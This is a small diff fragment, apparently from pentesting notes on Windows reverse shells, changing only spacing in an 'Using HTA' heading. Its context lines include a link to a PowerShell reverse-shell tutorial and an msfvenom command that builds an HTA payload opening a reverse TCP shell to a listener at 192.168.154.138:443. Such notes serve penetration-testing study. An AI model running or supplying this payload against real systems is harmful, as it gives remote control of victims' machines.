@@ -99,7 +99,7 @@ exploit
 https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/
 
 
-Using HTA:
+Using HTA :
 ```bash
 msfvenom -p windows/shell_reverse_tcp lhost=192.168.154.138 lport=443 -f hta-psh > shell.hta
 
